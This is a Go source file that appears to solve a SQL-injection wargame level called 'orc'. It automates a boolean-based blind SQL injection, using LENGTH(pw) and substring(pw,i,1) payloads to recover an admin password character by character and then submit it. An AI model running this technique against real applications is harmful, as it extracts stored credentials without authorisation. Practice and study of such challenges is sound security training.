package problem

import(
	"fmt"
	"strconv"
	"strings"
)

func find_len(file string, session string) int{
	for length := 0 ; length < 50; length += 1 {
		s_pw := "' or LENGTH(pw) = '" + strconv.Itoa(length)
		param := map[string]string{
			"pw" : s_pw,
		}
		
		contents := connect(file, param, session)
		if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
			return length
		}
	}
	return 0
}

func find_pw(file string, length int, session string)string{
	result := ""
	NEXT_STR:
	for i := 1 ; i <= length; i += 1 {
		url_str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
		for j :=0 ; j< len(url_str); j += 1 {
			s_pw := "' or substring(pw," + strconv.Itoa(i) + ",1) = '" + string(url_str[j])
			param := map[string]string{
				"pw" : s_pw,
			}
			
			contents := connect(file, param, session)
			if strings.Contains(string(contents),"<h2>Hello admin</h2>"){
				result += string(url_str[j])
				continue NEXT_STR
			}
		}
	}
	return result
}

func Orc(session string){
	file := "orc_c6199859b81e3a30d63d948875f6a3dd.php"
	
	length := find_len(file, session)
	//fmt.Println("Key length is "+ strconv.Itoa(length) + ".")
	
	pw_str := find_pw(file,length, session)
	//fmt.Println("pw is "+ pw_str + ".")

	param := map[string]string{
		"pw" : pw_str,
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"ORC Clear!"){
		fmt.Println("ORC Clear!")
	}
}
